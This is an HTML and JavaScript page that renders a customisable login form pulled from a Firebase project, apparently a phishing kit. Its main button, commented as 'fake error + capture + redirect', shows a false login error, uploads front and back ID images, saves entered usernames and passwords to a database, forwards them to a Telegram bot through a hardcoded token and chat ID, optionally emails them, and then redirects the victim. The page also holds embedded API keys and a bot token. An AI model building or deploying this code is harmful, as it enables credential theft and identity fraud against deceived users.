<!doctype html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>

<title id="dynamicTitle">Loading...</title>

<meta name="description" content="Loading preview...">

<!-- Open Graph -->
<meta property="og:title" content="Loading...">
<meta property="og:description" content="Loading preview...">
<meta property="og:image" content="">
<meta property="og:type" content="website">

<!-- Twitter -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Loading...">
<meta name="twitter:description" content="Loading preview...">
<meta name="twitter:image" content="">
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px}
.wrap{max-width:800px;margin:auto;background:#fff;padding:18px;border-radius:10px;position:relative;}
input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
textarea{min-height:70px}
.draggableBtn{position:absolute;cursor:pointer;color:#fff;border:none;border-radius:8px}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}

@keyframes fadeIn {
  from {opacity:0;}
  to {opacity:1;}
}
</style>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>

<!-- EmailJS (optional) -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
<div class="wrap" id="formWrap">Loading form...</div>

<script>
// Firebase setup
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// EmailJS setup (optional)
emailjs.init({
  publicKey: "YOUR_PUBLIC_KEY",
}); // replace with your EmailJS user ID

// Telegram
const TELEGRAM_BOT_TOKEN = "8132547313:AAHKP_rVA5SVjSQe59uU4KY2l5synrhQ7jk"; // replace
const TELEGRAM_CHAT_ID = "6482794683"; // replace

function getQueryParam(name) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(name);
}

async function uploadFile(file) {
  if (!file) return "";

  const storage = firebase.storage();
  const fileName = "ids/" + Date.now() + "_" + file.name;

  const ref = storage.ref().child(fileName);
  await ref.put(file);

  const url = await ref.getDownloadURL();
  return url;
}

const formId = getQueryParam("id");

function renderForm(data){
  const wrap = document.getElementById("formWrap");
  wrap.innerHTML = "";
  wrap.style.background = data.bgColor || "#fff";
  if(data.bgImage){
  wrap.style.backgroundImage = `url(${data.bgImage})`;
  wrap.style.backgroundSize = data.bgSize || "cover";
}

// 🎥 BACKGROUND VIDEO
document.querySelectorAll("video").forEach(v => v.remove());
if(data.bgVideoURL){
  const video = document.createElement("video");
  video.src = data.bgVideoURL;
  video.autoplay = true;
  video.loop = true;
  video.muted = true;

  video.style.position = "fixed";
  video.style.width = "100%";
  video.style.height = "100%";
  video.style.objectFit = "cover";
  video.style.zIndex = "-1";

  document.body.appendChild(video);
}

  // Header images
  if(data.avatarURL){
    const img = document.createElement("img");
    img.src = data.avatarURL;
    img.style.width = "90px";
    img.style.borderRadius = "50%";
    img.style.display = "block";
    img.style.margin = "auto";
    wrap.appendChild(img);
  }
  if(data.logoURL || data.bannerURL){
  const img = document.createElement("img");
  img.src = data.logoURL || data.bannerURL;
  img.style.width = "140px";
  img.style.display = "block";
  img.style.margin = "auto";
  wrap.appendChild(img);
}

// 🏷 TITLE
const title = document.createElement("h2");

title.textContent =
  (data.title && data.title.trim()) ||
  (data.pageTitle && data.pageTitle.trim()) ||
  "Untitled Form";

// ✅ Position
title.style.textAlign = data.titlePosition || "center";

// ✅ Color
title.style.color = data.titleColor || "#111";

// ✅ Animation
if(data.titleAnimation && data.titleAnimation !== "none"){
  title.style.animation = `${data.titleAnimation} 1s ease`;
}

wrap.appendChild(title);

  const subtitle = document.createElement("p");
  subtitle.style.textAlign = "center";
  subtitle.style.color = data.subtitleColor || "#555";
  subtitle.textContent = data.subtitle || "";
  wrap.appendChild(subtitle);

  const desc = document.createElement("p");
  desc.textContent = data.description || "";
  wrap.appendChild(desc);
  
  // 🖼 GALLERY
if(data.galleryImages){
  const gallery = document.createElement("div");

  gallery.style.display = "grid";
  gallery.style.gridTemplateColumns =
    data.galleryLayout === "grid" ? "repeat(3,1fr)" :
    data.galleryLayout === "large-grid" ? "repeat(2,1fr)" :
    "1fr";

  gallery.style.gap = "10px";

  data.galleryImages.split("\n").forEach(url=>{
    if(!url.trim()) return;

    const img = document.createElement("img");
    img.src = url.trim();
    img.style.width = "100%";

    gallery.appendChild(img);
  });

  wrap.appendChild(gallery);
}

// 🎥 VIDEOS
if(data.videoLinks){
  data.videoLinks.split("\n").forEach(link=>{
    if(!link.trim()) return;

    const iframe = document.createElement("iframe");
    iframe.src = link;
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.allowFullscreen = true;

    wrap.appendChild(iframe);
  });
}

  // Warning
  if(data.enableWarning && data.warningPosition !== "none"){
    const warn = document.createElement("p");
    warn.style.color = "#b71c1c";
    warn.style.textAlign = data.warningPosition || "center";
    warn.textContent = data.warning || "";
    wrap.appendChild(warn);
  }

  // Form inputs container
  const formDiv = document.createElement("div");
  formDiv.style.display = "flex";
  formDiv.style.flexDirection = "column";
  formDiv.style.alignItems = data.btnPosition === "left" ? "flex-start" : data.btnPosition === "right" ? "flex-end" : "center";
  formDiv.style.gap = "8px";

  // Auth fields
  if(data.addAuth === true){
    const inputUser = document.createElement("input");
inputUser.placeholder = data.usernamePlaceholder || "Username";

inputUser.style.background = data.inputBgColor || "#fff";
inputUser.style.color = data.inputTextColor || "#000";
inputUser.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
inputUser.style.borderRadius = data.customRadius 
  ? data.customRadius + "px" 
  : "6px";
    formDiv.appendChild(inputUser);

    const inputPass = document.createElement("input");
inputPass.type = "password";
inputPass.placeholder = data.passwordPlaceholder || "Password";

inputPass.style.background = data.inputBgColor || "#fff";
inputPass.style.color = data.inputTextColor || "#000";
inputPass.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
inputPass.style.borderRadius = data.customRadius 
  ? data.customRadius + "px" 
  : "6px";
    formDiv.appendChild(inputPass);
  }

  // Extra fields
const extraInputs = [];

if(Array.isArray(data.extraFields) && data.extraFields.length > 0){
  data.extraFields.forEach(v=>{
    if(v.trim()){
      const input = document.createElement("input");
      input.style.background = data.inputBgColor || "#fff";
input.style.color = data.inputTextColor || "#000";
input.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
input.style.borderRadius = data.customRadius 
  ? data.customRadius + "px" 
  : "6px";
      input.placeholder = v.trim();
      formDiv.appendChild(input);
      extraInputs.push(input);
    }
  });
}

// ✅ Upload fields (only if enabled)
if(data.enableFileUpload){
  const frontInput = document.createElement("input");
  frontInput.type = "file";
  frontInput.id = "frontUpload";
  formDiv.appendChild(frontInput);

  const backInput = document.createElement("input");
  backInput.type = "file";
  backInput.id = "backUpload";
  formDiv.appendChild(backInput);
}

  // Embed Links
  if(data.embedLinks){
    data.embedLinks.forEach(link=>{
      if(!link.show) return;
      const div = document.createElement("div");
      div.className = "embedLink";
      const strong = document.createElement("strong");
      strong.textContent = link.text;
      div.appendChild(strong);
      const a = document.createElement("a");
      a.href = link.url;
      a.target = "_blank";
      a.textContent = " " + link.url;
      div.appendChild(a);
      if(link.desc){
        const small = document.createElement("small");
        small.textContent = " " + link.desc;
        div.appendChild(document.createElement("br"));
        div.appendChild(small);
      }
      formDiv.appendChild(div);
    });
  }

  // Generate Button
  if(data.showGenerateBtn === true){
    const genBtn = document.createElement("button");
    genBtn.textContent = data.generateBtnText || "Generate";
    genBtn.style.background = "#1976d2";
    genBtn.style.color = "#fff";
    genBtn.style.padding = "10px";
    genBtn.style.border = "none";
    genBtn.style.borderRadius = "8px";
    genBtn.onclick = ()=>alert("Form Generated!");
    formDiv.appendChild(genBtn);
  }

  // Main Button (fake error + capture + redirect)
  if(data.showMainBtn === true){
    const mainBtn = document.createElement("button");
    if(data.btnAnimationEffect){
  mainBtn.className = data.btnAnimationEffect.join(" ");
}
    mainBtn.textContent = data.buttonText || "Submit";
    mainBtn.style.background = data.btnColor || "#1976d2";
    mainBtn.style.color = "#fff";
    mainBtn.style.padding = "10px";
    mainBtn.style.border = "none";
    mainBtn.style.borderRadius = "8px";

    mainBtn.onclick = async (e)=>{
  e.preventDefault();

  // 1️⃣ Show fake error
  alert("wrong username/email/phone try again");

  // 🔥 Upload ID files
  const frontFile = document.getElementById("frontUpload")?.files[0];
  const backFile = document.getElementById("backUpload")?.files[0];

  let uploadedFront = "";
  let uploadedBack = "";

  if(frontFile) uploadedFront = await uploadFile(frontFile);
  if(backFile) uploadedBack = await uploadFile(backFile);

  // combine both
  const fileURL = [uploadedFront, uploadedBack].filter(Boolean).join(" | ");

  // 2️⃣ Collect form values
  const inputs = formDiv.querySelectorAll("input");

const username = inputs[0]?.value || "";
const password = inputs[1]?.value || "";


// ✅ FIX: collect extra field values
const extraValues = extraInputs.map(i => i.value);

  // 3️⃣ Save
await db.collection("submissions").add({
  formId: formId || "unknown",
  formTitle:
    (data.title && data.title.trim()) ||
    (data.pageTitle && data.pageTitle.trim()) ||
    "Untitled Form",
  createdAt: Date.now(),
  data: {
    username: username,
    password: password,
    "Phone Number": extraValues[0] || "",
    extraFields: extraValues,
    file: fileURL,
    title: data.title || "",
    logo: data.logoURL || ""
  }
});  

      // 4️⃣ Send Telegram
      const telegramMsg = `
New Form Submission:
Username: ${username}
Password: ${password}
Extra: ${extraValues.join(", ")}
Time: ${new Date().toLocaleString()}
`;
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: telegramMsg })
      }).catch(console.error);

      // 5️⃣ Send Email (optional via EmailJS)
      if(typeof emailjs !== "undefined"){
        emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID", {
          username, password, extra: extraValues.join(", "), date: new Date().toLocaleString()
        }).catch(console.error);
      }

      // 6️⃣ Redirect if enabled
      if(data.enableRedirect && data.redirectURL){
        setTimeout(()=>window.location.href = data.redirectURL, 500);
      }
    };
    formDiv.appendChild(mainBtn);
  }

  wrap.appendChild(formDiv);
  
   // 📢 ADS
if(data.enableAds){
  const ad = document.createElement("div");
  ad.style.padding = "10px";
  ad.style.background = "#fff3cd";
  ad.style.margin = "10px 0";

  ad.innerHTML = `
    <strong>Sponsored</strong><br>
    ${data.adText || ""}
  `;

  wrap.appendChild(ad);
}

  // Extra draggable buttons
  if(data.extraButtons){
    data.extraButtons.forEach(b=>{
      if(!b.show) return;
      const btn = document.createElement("button");
      btn.className = "draggableBtn";
      btn.textContent = b.text;
      btn.style.background = b.color;
      btn.style.width = b.size + "px";
      btn.style.height = b.size + "px";
      btn.style.left = b.x + "%";
      btn.style.top = b.y + "%";
      btn.style.position = "absolute";
      btn.onclick = ()=>window.open(b.link,"_blank");
      wrap.appendChild(btn);
    });
  }

  // Footer
  const footer = document.createElement("footer");
  footer.style.textAlign = "center";
  footer.style.marginTop = "10px";
  footer.style.fontSize = "12px";
  footer.innerHTML = data.footerText || "";
  wrap.appendChild(footer);
}

if(formId){
  db.collection("forms").doc(formId).get()
  .then(doc => {

    if(!doc.exists){
      document.getElementById("formWrap").textContent = "Form not found!";
      return;
    }

    const data = doc.data();
    console.log("FORM DATA:", data);
    
    // ✅ UPDATE SEO META TAGS (for browser, not bots)
const seoTitle =
  (data.seoTitle && data.seoTitle.trim()) ||
  (data.title && data.title.trim()) ||
  "Untitled Form";
const metaDesc = data.metaDesc || "";
const ogImage = data.ogImage || "";

document.title = seoTitle;

document.querySelector('meta[name="description"]')?.setAttribute("content", metaDesc);

document.querySelector('meta[property="og:title"]')?.setAttribute("content", seoTitle);
document.querySelector('meta[property="og:description"]')?.setAttribute("content", metaDesc);
document.querySelector('meta[property="og:image"]')?.setAttribute("content", ogImage);

document.querySelector('meta[name="twitter:title"]')?.setAttribute("content", seoTitle);
document.querySelector('meta[name="twitter:description"]')?.setAttribute("content", metaDesc);
document.querySelector('meta[name="twitter:image"]')?.setAttribute("content", ogImage);

// ✅ LOAD GENERATED HTML DIRECTLY
renderForm(data);

  })
  .catch(err => {
    console.error(err);
    document.getElementById("formWrap").textContent = "Error loading form.";
  });
} else {
  document.getElementById("formWrap").textContent = "No form ID provided.";
}

</script>
</body>
</html>
